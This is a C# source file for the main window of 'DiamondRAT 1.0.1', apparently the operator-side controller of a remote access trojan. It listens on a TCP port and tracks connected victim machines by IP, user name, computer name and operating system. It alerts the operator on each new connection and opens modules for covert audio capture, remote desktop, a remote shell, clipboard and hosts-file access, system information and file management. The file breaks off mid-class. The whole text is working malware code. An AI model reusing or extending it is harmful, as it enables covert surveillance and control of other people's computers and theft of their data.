using DiamondRAT.Properties;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Devices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace DiamondRAT
{
    public class Form1 : Form
    {
        private IContainer components;
        private ContextMenuStrip RightclickMain;
        private NotifyIcon Notify;
        private ToolStripMenuItem SystemInformationToolStripMenuItem;
        private TabPage TabSettings;
        private GroupBox GroupBox4;
        private Label Label19;
        private PictureBox PictureBox2;
        private GroupBox GroupBox1;
        private CheckBox cb_PlaySound;
        private CheckBox cb_ShowNotification;
        private CheckBox cb_AutoListening;
        private Button btn_stoplistening;
        private Button btn_startlistening;
        private NumericUpDown NumericUpDown1;
        private Label Label3;
        private Label Label2;
        private Label Label1;
        private TabPage TabClient;
        private ListView ListView1;
        private ColumnHeader ColumnHeader1;
        private ColumnHeader ColumnHeader2;
        private ColumnHeader ColumnHeader3;
        private ColumnHeader ColumnHeader4;
        private ColumnHeader ColumnHeader5;
        private ToolStripMenuItem RemoteDesktopToolStripMenuItem;
        private ToolStripMenuItem AudioCaptureToolStripMenuItem;
        private ToolStripMenuItem MiscellaneousToolStripMenuItem1;
        private Label label4;
        private Button btn_pfx;
        private TextBox txt_pfx;
        private TextBox txt_key;
        private ToolStripSeparator toolStripSeparator1;
        private ToolStripMenuItem connectionToolStripMenuItem;
        private ToolStripMenuItem removeToolStripMenuItem;
        private ToolStripMenuItem disconnectToolStripMenuItem;
        private TabControl CodePlexTabControl1;

        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components != null)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.RightclickMain = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.AudioCaptureToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.MiscellaneousToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.RemoteDesktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SystemInformationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
            this.connectionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.removeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.Notify = new System.Windows.Forms.NotifyIcon(this.components);
            this.TabSettings = new System.Windows.Forms.TabPage();
            this.GroupBox4 = new System.Windows.Forms.GroupBox();
            this.Label19 = new System.Windows.Forms.Label();
            this.PictureBox2 = new System.Windows.Forms.PictureBox();
            this.GroupBox1 = new System.Windows.Forms.GroupBox();
            this.txt_key = new System.Windows.Forms.TextBox();
            this.btn_pfx = new System.Windows.Forms.Button();
            this.cb_PlaySound = new System.Windows.Forms.CheckBox();
            this.txt_pfx = new System.Windows.Forms.TextBox();
            this.cb_ShowNotification = new System.Windows.Forms.CheckBox();
            this.label4 = new System.Windows.Forms.Label();
            this.cb_AutoListening = new System.Windows.Forms.CheckBox();
            this.NumericUpDown1 = new System.Windows.Forms.NumericUpDown();
            this.btn_stoplistening = new System.Windows.Forms.Button();
            this.Label3 = new System.Windows.Forms.Label();
            this.btn_startlistening = new System.Windows.Forms.Button();
            this.Label2 = new System.Windows.Forms.Label();
            this.Label1 = new System.Windows.Forms.Label();
            this.TabClient = new System.Windows.Forms.TabPage();
            this.ListView1 = new System.Windows.Forms.ListView();
            this.ColumnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.ColumnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.ColumnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.ColumnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.ColumnHeader5 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.CodePlexTabControl1 = new System.Windows.Forms.TabControl();
            this.RightclickMain.SuspendLayout();
            this.TabSettings.SuspendLayout();
            this.GroupBox4.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox2)).BeginInit();
            this.GroupBox1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.NumericUpDown1)).BeginInit();
            this.TabClient.SuspendLayout();
            this.CodePlexTabControl1.SuspendLayout();
            this.SuspendLayout();
            // 
            // RightclickMain
            // 
            this.RightclickMain.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.AudioCaptureToolStripMenuItem,
            this.MiscellaneousToolStripMenuItem1,
            this.RemoteDesktopToolStripMenuItem,
            this.SystemInformationToolStripMenuItem,
            this.toolStripSeparator1,
            this.connectionToolStripMenuItem});
            this.RightclickMain.Name = "RightclickMain";
            this.RightclickMain.Size = new System.Drawing.Size(179, 120);
            // 
            // AudioCaptureToolStripMenuItem
            // 
            this.AudioCaptureToolStripMenuItem.Name = "AudioCaptureToolStripMenuItem";
            this.AudioCaptureToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.AudioCaptureToolStripMenuItem.Text = "Audio Capture";
            this.AudioCaptureToolStripMenuItem.Click += new System.EventHandler(this.AudioCaptureToolStripMenuItem_Click);
            // 
            // MiscellaneousToolStripMenuItem1
            // 
            this.MiscellaneousToolStripMenuItem1.Name = "MiscellaneousToolStripMenuItem1";
            this.MiscellaneousToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
            this.MiscellaneousToolStripMenuItem1.Text = "Miscellaneous";
            this.MiscellaneousToolStripMenuItem1.Click += new System.EventHandler(this.MiscellaneousToolStripMenuItem1_Click);
            // 
            // RemoteDesktopToolStripMenuItem
            // 
            this.RemoteDesktopToolStripMenuItem.Name = "RemoteDesktopToolStripMenuItem";
            this.RemoteDesktopToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.RemoteDesktopToolStripMenuItem.Text = "Remote Desktop";
            this.RemoteDesktopToolStripMenuItem.Click += new System.EventHandler(this.RemoteDesktopToolStripMenuItem_Click);
            // 
            // SystemInformationToolStripMenuItem
            // 
            this.SystemInformationToolStripMenuItem.Name = "SystemInformationToolStripMenuItem";
            this.SystemInformationToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.SystemInformationToolStripMenuItem.Text = "System Information";
            this.SystemInformationToolStripMenuItem.Click += new System.EventHandler(this.SystemInformationToolStripMenuItem_Click);
            // 
            // toolStripSeparator1
            // 
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new System.Drawing.Size(175, 6);
            // 
            // connectionToolStripMenuItem
            // 
            this.connectionToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.disconnectToolStripMenuItem,
            this.removeToolStripMenuItem});
            this.connectionToolStripMenuItem.Name = "connectionToolStripMenuItem";
            this.connectionToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.connectionToolStripMenuItem.Text = "Connection";
            // 
            // disconnectToolStripMenuItem
            // 
            this.disconnectToolStripMenuItem.Name = "disconnectToolStripMenuItem";
            this.disconnectToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
            this.disconnectToolStripMenuItem.Text = "Disconnect";
            this.disconnectToolStripMenuItem.Click += new System.EventHandler(this.DisconnectToolStripMenuItem_Click);
            // 
            // removeToolStripMenuItem
            // 
            this.removeToolStripMenuItem.Name = "removeToolStripMenuItem";
            this.removeToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
            this.removeToolStripMenuItem.Text = "Remove";
            this.removeToolStripMenuItem.Click += new System.EventHandler(this.RemoveToolStripMenuItem_Click);
            // 
            // Notify
            // 
            this.Notify.Icon = ((System.Drawing.Icon)(resources.GetObject("Notify.Icon")));
            this.Notify.Text = "DiamondRat";
            this.Notify.Visible = true;
            // 
            // TabSettings
            // 
            this.TabSettings.Controls.Add(this.GroupBox4);
            this.TabSettings.Controls.Add(this.GroupBox1);
            this.TabSettings.Location = new System.Drawing.Point(4, 22);
            this.TabSettings.Name = "TabSettings";
            this.TabSettings.Size = new System.Drawing.Size(785, 417);
            this.TabSettings.TabIndex = 2;
            this.TabSettings.Text = "Options";
            // 
            // GroupBox4
            // 
            this.GroupBox4.Controls.Add(this.Label19);
            this.GroupBox4.Controls.Add(this.PictureBox2);
            this.GroupBox4.Location = new System.Drawing.Point(8, 288);
            this.GroupBox4.Name = "GroupBox4";
            this.GroupBox4.Size = new System.Drawing.Size(566, 113);
            this.GroupBox4.TabIndex = 2;
            this.GroupBox4.TabStop = false;
            this.GroupBox4.Text = "About";
            // 
            // Label19
            // 
            this.Label19.AutoSize = true;
            this.Label19.Location = new System.Drawing.Point(94, 24);
            this.Label19.Name = "Label19";
            this.Label19.Size = new System.Drawing.Size(355, 39);
            this.Label19.TabIndex = 1;
            this.Label19.Text = resources.GetString("Label19.Text");
            // 
            // PictureBox2
            // 
            this.PictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("PictureBox2.Image")));
            this.PictureBox2.Location = new System.Drawing.Point(6, 24);
            this.PictureBox2.Name = "PictureBox2";
            this.PictureBox2.Size = new System.Drawing.Size(83, 83);
            this.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.PictureBox2.TabIndex = 0;
            this.PictureBox2.TabStop = false;
            // 
            // GroupBox1
            // 
            this.GroupBox1.Controls.Add(this.txt_key);
            this.GroupBox1.Controls.Add(this.btn_pfx);
            this.GroupBox1.Controls.Add(this.cb_PlaySound);
            this.GroupBox1.Controls.Add(this.txt_pfx);
            this.GroupBox1.Controls.Add(this.cb_ShowNotification);
            this.GroupBox1.Controls.Add(this.label4);
            this.GroupBox1.Controls.Add(this.cb_AutoListening);
            this.GroupBox1.Controls.Add(this.NumericUpDown1);
            this.GroupBox1.Controls.Add(this.btn_stoplistening);
            this.GroupBox1.Controls.Add(this.Label3);
            this.GroupBox1.Controls.Add(this.btn_startlistening);
            this.GroupBox1.Controls.Add(this.Label2);
            this.GroupBox1.Controls.Add(this.Label1);
            this.GroupBox1.Location = new System.Drawing.Point(5, 3);
            this.GroupBox1.Name = "GroupBox1";
            this.GroupBox1.Size = new System.Drawing.Size(775, 279);
            this.GroupBox1.TabIndex = 0;
            this.GroupBox1.TabStop = false;
            this.GroupBox1.Text = "Connection";
            // 
            // txt_key
            // 
            this.txt_key.Location = new System.Drawing.Point(77, 62);
            this.txt_key.Name = "txt_key";
            this.txt_key.Size = new System.Drawing.Size(212, 20);
            this.txt_key.TabIndex = 7;
            this.txt_key.TextChanged += new System.EventHandler(this.Txt_key_TextChanged);
            // 
            // btn_pfx
            // 
            this.btn_pfx.Location = new System.Drawing.Point(641, 91);
            this.btn_pfx.Name = "btn_pfx";
            this.btn_pfx.Size = new System.Drawing.Size(39, 23);
            this.btn_pfx.TabIndex = 6;
            this.btn_pfx.Text = "...";
            this.btn_pfx.UseVisualStyleBackColor = true;
            this.btn_pfx.Click += new System.EventHandler(this.Btn_pfx_Click);
            // 
            // cb_PlaySound
            // 
            this.cb_PlaySound.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.cb_PlaySound.AutoSize = true;
            this.cb_PlaySound.Location = new System.Drawing.Point(77, 186);
            this.cb_PlaySound.Name = "cb_PlaySound";
            this.cb_PlaySound.Size = new System.Drawing.Size(152, 17);
            this.cb_PlaySound.TabIndex = 6;
            this.cb_PlaySound.Text = "Play Sound on Connection";
            this.cb_PlaySound.UseVisualStyleBackColor = true;
            this.cb_PlaySound.CheckedChanged += new System.EventHandler(this.cb_PlaySound_CheckedChanged);
            // 
            // txt_pfx
            // 
            this.txt_pfx.Location = new System.Drawing.Point(77, 92);
            this.txt_pfx.Name = "txt_pfx";
            this.txt_pfx.Size = new System.Drawing.Size(557, 20);
            this.txt_pfx.TabIndex = 5;
            this.txt_pfx.TextChanged += new System.EventHandler(this.Txt_pfx_TextChanged);
            // 
            // cb_ShowNotification
            // 
            this.cb_ShowNotification.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.cb_ShowNotification.AutoSize = true;
            this.cb_ShowNotification.Location = new System.Drawing.Point(77, 163);
            this.cb_ShowNotification.Name = "cb_ShowNotification";
            this.cb_ShowNotification.Size = new System.Drawing.Size(181, 17);
            this.cb_ShowNotification.TabIndex = 5;
            this.cb_ShowNotification.Text = "Show Notification on Connection";
            this.cb_ShowNotification.UseVisualStyleBackColor = true;
            this.cb_ShowNotification.CheckedChanged += new System.EventHandler(this.cb_ShowNotification_CheckedChanged);
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(16, 96);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(52, 13);
            this.label4.TabIndex = 4;
            this.label4.Text = "PFX Cert:";
            // 
            // cb_AutoListening
            // 
            this.cb_AutoListening.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.cb_AutoListening.AutoSize = true;
            this.cb_AutoListening.Location = new System.Drawing.Point(77, 140);
            this.cb_AutoListening.Name = "cb_AutoListening";
            this.cb_AutoListening.Size = new System.Drawing.Size(129, 17);
            this.cb_AutoListening.TabIndex = 4;
            this.cb_AutoListening.Text = "Enable Auto Listening";
            this.cb_AutoListening.UseVisualStyleBackColor = true;
            this.cb_AutoListening.CheckedChanged += new System.EventHandler(this.cb_AutoListening_CheckedChanged);
            // 
            // NumericUpDown1
            // 
            this.NumericUpDown1.Location = new System.Drawing.Point(77, 32);
            this.NumericUpDown1.Maximum = new decimal(new int[] {
            65535,
            0,
            0,
            0});
            this.NumericUpDown1.Name = "NumericUpDown1";
            this.NumericUpDown1.Size = new System.Drawing.Size(59, 20);
            this.NumericUpDown1.TabIndex = 3;
            this.NumericUpDown1.ValueChanged += new System.EventHandler(this.NumericUpDown1_ValueChanged);
            // 
            // btn_stoplistening
            // 
            this.btn_stoplistening.Location = new System.Drawing.Point(497, 171);
            this.btn_stoplistening.Name = "btn_stoplistening";
            this.btn_stoplistening.Size = new System.Drawing.Size(137, 32);
            this.btn_stoplistening.TabIndex = 3;
            this.btn_stoplistening.Text = "Stop Listening";
            this.btn_stoplistening.UseVisualStyleBackColor = true;
            this.btn_stoplistening.Click += new System.EventHandler(this.btn_stoplistening_Click);
            // 
            // Label3
            // 
            this.Label3.AutoSize = true;
            this.Label3.Location = new System.Drawing.Point(16, 66);
            this.Label3.Name = "Label3";
            this.Label3.Size = new System.Drawing.Size(28, 13);
            this.Label3.TabIndex = 2;
            this.Label3.Text = "Key:";
            // 
            // btn_startlistening
            // 
            this.btn_startlistening.Location = new System.Drawing.Point(336, 171);
            this.btn_startlistening.Name = "btn_startlistening";
            this.btn_startlistening.Size = new System.Drawing.Size(137, 32);
            this.btn_startlistening.TabIndex = 2;
            this.btn_startlistening.Text = "Start Listening";
            this.btn_startlistening.UseVisualStyleBackColor = true;
            this.btn_startlistening.Click += new System.EventHandler(this.btn_startlistening_Click);
            // 
            // Label2
            // 
            this.Label2.AutoSize = true;
            this.Label2.Location = new System.Drawing.Point(142, 36);
            this.Label2.Name = "Label2";
            this.Label2.Size = new System.Drawing.Size(69, 13);
            this.Label2.TabIndex = 1;
            this.Label2.Text = "Status: Idle...";
            // 
            // Label1
            // 
            this.Label1.AutoSize = true;
            this.Label1.Location = new System.Drawing.Point(16, 36);
            this.Label1.Name = "Label1";
            this.Label1.Size = new System.Drawing.Size(32, 13);
            this.Label1.TabIndex = 0;
            this.Label1.Text = "Port: ";
            // 
            // TabClient
            // 
            this.TabClient.Controls.Add(this.ListView1);
            this.TabClient.Location = new System.Drawing.Point(4, 22);
            this.TabClient.Name = "TabClient";
            this.TabClient.Padding = new System.Windows.Forms.Padding(3);
            this.TabClient.Size = new System.Drawing.Size(785, 417);
            this.TabClient.TabIndex = 0;
            this.TabClient.Text = "Connections";
            // 
            // ListView1
            // 
            this.ListView1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.ListView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.ColumnHeader1,
            this.ColumnHeader2,
            this.ColumnHeader3,
            this.ColumnHeader4,
            this.ColumnHeader5});
            this.ListView1.ContextMenuStrip = this.RightclickMain;
            this.ListView1.FullRowSelect = true;
            this.ListView1.HideSelection = false;
            this.ListView1.Location = new System.Drawing.Point(3, 3);
            this.ListView1.Name = "ListView1";
            this.ListView1.ShowItemToolTips = true;
            this.ListView1.Size = new System.Drawing.Size(779, 411);
            this.ListView1.TabIndex = 0;
            this.ListView1.UseCompatibleStateImageBehavior = false;
            this.ListView1.View = System.Windows.Forms.View.Details;
            // 
            // ColumnHeader1
            // 
            this.ColumnHeader1.Text = "WAN";
            this.ColumnHeader1.Width = 109;
            // 
            // ColumnHeader2
            // 
            this.ColumnHeader2.Text = "LAN";
            this.ColumnHeader2.Width = 109;
            // 
            // ColumnHeader3
            // 
            this.ColumnHeader3.Text = "User Name";
            this.ColumnHeader3.Width = 89;
            // 
            // ColumnHeader4
            // 
            this.ColumnHeader4.Text = "Computer Name";
            this.ColumnHeader4.Width = 144;
            // 
            // ColumnHeader5
            // 
            this.ColumnHeader5.Text = "Operating System";
            this.ColumnHeader5.Width = 301;
            // 
            // CodePlexTabControl1
            // 
            this.CodePlexTabControl1.Controls.Add(this.TabClient);
            this.CodePlexTabControl1.Controls.Add(this.TabSettings);
            this.CodePlexTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.CodePlexTabControl1.Location = new System.Drawing.Point(0, 0);
            this.CodePlexTabControl1.Name = "CodePlexTabControl1";
            this.CodePlexTabControl1.SelectedIndex = 0;
            this.CodePlexTabControl1.Size = new System.Drawing.Size(793, 443);
            this.CodePlexTabControl1.TabIndex = 0;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(793, 443);
            this.Controls.Add(this.CodePlexTabControl1);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "DiamondRAT 1.0.1";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.RightclickMain.ResumeLayout(false);
            this.TabSettings.ResumeLayout(false);
            this.GroupBox4.ResumeLayout(false);
            this.GroupBox4.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox2)).EndInit();
            this.GroupBox1.ResumeLayout(false);
            this.GroupBox1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.NumericUpDown1)).EndInit();
            this.TabClient.ResumeLayout(false);
            this.CodePlexTabControl1.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        private int _port;
        private TcpListener _listener;
        private Thread _listeningThread;
        private ini _ini = new ini();
        private List<MyForm> _forms = new List<MyForm>();

        public Form1()
        {
            InitializeComponent();

            _port = 0;
        }

        private void AddMyFormToList(MyForm myForm)
        {
            foreach (MyForm form in _forms)
            {
                if (form.Connection == myForm.Connection && form.FormType == myForm.FormType)
                {
                    _forms.Remove(form);
                    break;
                }
            }
            _forms.Add(myForm);
        }

        private MyForm GetMyFormByConnection(Connection connection, FormType formType)
        {
            foreach (MyForm form in _forms)
            {
                if (form.Connection == connection && form.FormType == formType)
                    return form;
            }
            return null;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                global.Key = txt_key.Text = _ini.Read("Options", "Key");

                txt_pfx.Text = _ini.Read("Options", "Cert");
                cb_AutoListening.Checked = _ini.ReadBool("Options", "AutoListening");
                cb_ShowNotification.Checked = _ini.ReadBool("Options", "ShowNotification");
                cb_PlaySound.Checked = _ini.ReadBool("Options", "PlaySound");

                uint port = _ini.ReadInt("Options", "Port");
                if (port != 0)
                {
                    _port = (int)port;
                    NumericUpDown1.Value = new decimal(_port);
                    Label2.Text = "Status: Idle...";
                    if (cb_AutoListening.Checked)
                    {
                        _listeningThread = new Thread(Listen);
                        _listeningThread.IsBackground = true;
                        _listeningThread.Start();
                        ChangeText("Status: Listening...", Color.Green);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void btn_startlistening_Click(object sender, EventArgs e)
        {
            try
            {
                if (_port == 0)
                {
                    NumericUpDown1.Focus();
                    return;
                }

                if (txt_key.Text == "")
                {
                    txt_key.Focus();
                    return;
                }

                if (_listeningThread != null && _listeningThread.IsAlive)
                {
                    MessageBox.Show("You are already listening on this port!");
                }
                else
                {
                    _listeningThread = new Thread(Listen);
                    _listeningThread.IsBackground = true;
                    _listeningThread.Start();
                    ChangeText("Status: Listening...", Color.Green);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        public void Listen()
        {
            try
            {
                _listener = new TcpListener(IPAddress.Any, _port);
                _listener.Start();
                while (true)
                {
                    Connection connection = new Connection(_listener.AcceptTcpClient(), txt_pfx.Text);
                    connection.GotInfo = GotInfo;
                    connection.Disconnected = Disconnected;
                }
            }
            catch (Exception ex)
            {

            }
        }

        public void AddClient(Connection client, string msg)
        {
            string text = client.IPAddress;
            ListViewItem item = new ListViewItem(text);
            item.SubItems.Add(msg.Split('|')[1]);
            item.SubItems.Add(msg.Split('|')[2]);
            item.SubItems.Add(msg.Split('|')[3]);
            item.SubItems.Add(msg.Split('|')[4]);
            item.Tag = client;
            ListView1.Items.Add(item);

            if (cb_ShowNotification.Checked)
            {
                if (cb_PlaySound.Checked)
                    (new Audio()).Play(Resources.notify, AudioPlayMode.Background);

                Notify.BalloonTipIcon = ToolTipIcon.Info;
                Notify.BalloonTipText = "IP: " + client.IPAddress + "\r\n" +
                    "Username: " + msg.Split('|')[2] + "\r\n" +
                    "Computer Name: " + msg.Split('|')[3] + "\r\n" +
                    "Operating System: " + msg.Split('|')[4];
                Notify.BalloonTipTitle = "DiamondRAT | New Connection!";
                Notify.Visible = true;
                Notify.ShowBalloonTip(600);
            }
        }

        public void GotInfo(Connection Client, string Msg)
        {
            if (Msg.StartsWith("NewConnection"))
                Invoke((Action<Connection, string>)((client, msg) => { AddClient(client, msg); }), Client, Msg);

            else if (Msg.StartsWith("RecordingFile"))
            {
                Invoke((Action<Connection, string>)((client, msg) =>
                {
                    MyForm myform = GetMyFormByConnection(client, FormType.AudioCapture);
                    myform.ProcessMsg(msg);
                }), Client, Msg);
            }
            else if (Msg.StartsWith("HostsFile") || Msg.StartsWith("CPText") || Msg.StartsWith("Shell"))
            {
                Invoke((Action<Connection, string>)((client, msg) =>
                {
                    MyForm myform = GetMyFormByConnection(client, FormType.Miscellaneous);
                    myform.ProcessMsg(msg);
                }), Client, Msg);
            }
            else if (Msg.StartsWith("RemoteDesktop") || Msg.StartsWith("PCBounds"))
            {
                Invoke((Action<Connection, string>)((client, msg) =>
                {
                    MyForm myform = GetMyFormByConnection(client, FormType.RemoteDesktop);
                    myform.ProcessMsg(msg);
                }), Client, Msg);
            }
            else if (Msg.StartsWith("SystemInformation") || Msg.StartsWith("InstalledSoftware") || Msg.StartsWith("Drives") || Msg.StartsWith("FileManagerFiles") || Msg.StartsWith("IncomingFile"))
            {
                Invoke((Action<Connection, string>)((client, msg) =>
                {
                    MyForm myform = GetMyFormByConnection(client, FormType.SystemInformation);
                    myform.ProcessMsg(msg);
                }), Client, Msg);
            }
        }

        public void Disconnected(Connection Client)
        {
            Invoke((Action<Connection>)((client) => { Remove(client); }), Client);
        }

        public void Remove(Connection client)
        {
            ListViewItem item = null;
            for (int i = ListView1.Items.Count - 1; i >= 0; i--)
            {
                item = ListView1.Items[i];
                if (item.Tag as Connection == client)
                {
                    item.Remove();
                    break;
                }
            }

            if (cb_ShowNotification.Checked && item != null)
            {
                if (cb_PlaySound.Checked)
                    (new Audio()).Play(Resources.notify, AudioPlayMode.Background);
                Notify.BalloonTipIcon = ToolTipIcon.Error;
                Notify.BalloonTipText = "IP: " + item?.SubItems[1].Text;
                Notify.BalloonTipTitle = "DiamondRat | Disconnected!";
                Notify.Visible = true;
                Notify.ShowBalloonTip(600);
            }
        }

        public void SendToSelected(string Message)
        {
            foreach (ListViewItem item in ListView1.SelectedItems)
            {
                ((Connection)item.Tag).Send(Message);
            }
        }

        public void SendToAll(string Message)
        {
            foreach (ListViewItem item in ListView1.Items)
            {
                ((Connection)item.Tag).Send(Message);
            }
        }

        public void ChangeText(string text, Color color)
        {
            Label2.Text = text;
            Label2.ForeColor = color;
        }

        private void btn_stoplistening_Click(object sender, EventArgs e)
        {
            if (_listeningThread.IsAlive)
            {
                SendToAll("Disconnected");
                _listener.Server.Close();
                _listeningThread.Abort();

                ChangeText("Status: Idle...", Color.Black);

                ListView1.Items.Clear();
            }
        }

        private void NumericUpDown1_ValueChanged(object sender, EventArgs e)
        {
            _port = Convert.ToInt32(NumericUpDown1.Value);
            _ini.Write("Options", "Port", _port.ToString());
        }

        private void cb_AutoListening_CheckedChanged(object sender, EventArgs e)
        {
            if (cb_AutoListening.Checked)
                _ini.Write("Options", "AutoListening", "true");
            else
                _ini.Write("Options", "AutoListening", "false");
        }

        private void cb_ShowNotification_CheckedChanged(object sender, EventArgs e)
        {
            if (cb_ShowNotification.Checked)
                _ini.Write("Options", "ShowNotification", "true");
            else
                _ini.Write("Options", "ShowNotification", "false");
        }

        private void cb_PlaySound_CheckedChanged(object sender, EventArgs e)
        {
            if (cb_PlaySound.Checked)
                _ini.Write("Options", "PlaySound", "true");
            else
                _ini.Write("Options", "PlaySound", "false");
        }

        private void AudioCaptureToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in ListView1.SelectedItems)
            {
                MyForm myForm = GetMyFormByConnection((Connection)item.Tag, FormType.AudioCapture);
                if (myForm == null || myForm.IsDisposed)
                {
                    AudioCapture audioCapture = new AudioCapture();
                    audioCapture.Connection = (Connection)item.Tag;
                    audioCapture.Text = "Audio Capture - " + item.SubItems[1].Text + "@" + item.SubItems[2].Text + "@" + item.SubItems[3].Text;
                    audioCapture.Show();
                    AddMyFormToList(audioCapture);
                }
                else
                {
                    myForm.Focus();
                }
            }
        }

        private void MiscellaneousToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in ListView1.SelectedItems)
            {
                MyForm myForm = GetMyFormByConnection((Connection)item.Tag, FormType.Miscellaneous);
                if (myForm == null || myForm.IsDisposed)
                {
                    Miscellaneous miscellaneous = new Miscellaneous();
                    miscellaneous.Connection = (Connection)item.Tag;
                    miscellaneous.Text = "Miscellaneous - " + item.SubItems[1].Text + "@" + item.SubItems[2].Text + "@" + item.SubItems[3].Text;
                    miscellaneous.Show();
                    AddMyFormToList(miscellaneous);
                }
                else
                {
                    myForm.Focus();
                }
            }
        }

        private void RemoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in ListView1.SelectedItems)
            {
                MyForm myForm = GetMyFormByConnection((Connection)item.Tag, FormType.RemoteDesktop);
                if (myForm == null || myForm.IsDisposed)
                {
                    RemoteDesktop remoteDesktop = new RemoteDesktop();
                    remoteDesktop.Connection = (Connection)item.Tag;
                    remoteDesktop.Text = "Remote Desktop - " + item.SubItems[1].Text + "@" + item.SubItems[2].Text + "@" + item.SubItems[3].Text;
                    remoteDesktop.Show();
                    AddMyFormToList(remoteDesktop);
                }
                else
                {
                    myForm.Focus();
                }
            }
        }

        private void SystemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in ListView1.SelectedItems)
            {
                MyForm myForm = GetMyFormByConnection((Connection)item.Tag, FormType.SystemInformation);
                if (myForm == null || myForm.IsDisposed)
                {
                    SystemInformation systemInformation = new SystemInformation();
                    systemInformation.Connection = (Connection)item.Tag;
                    systemInformation.Text = "System Information - " + item.SubItems[1].Text + "@" + item.SubItems[2].Text + "@" + item.SubItems[3].Text;
                    systemInformation.Show();
                    AddMyFormToList(systemInformation);
                }
                else
                {
                    myForm.Focus();
                }
            }
        }

        private void DisconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in ListView1.SelectedItems)
            {
                ((Connection)item.Tag).Send("Disconnected");
            }
        }

        private void RemoveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = ListView1.Items.Count - 1; i >= 0; i--)
            {
                ListViewItem item = ListView1.Items[i];
                if (item.Selected)
                    item.Remove();
            }
        }

        private void Btn_pfx_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "pfx files|*.pfx|all files|*.*";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                txt_pfx.Text = ofd.FileName;
            }
        }

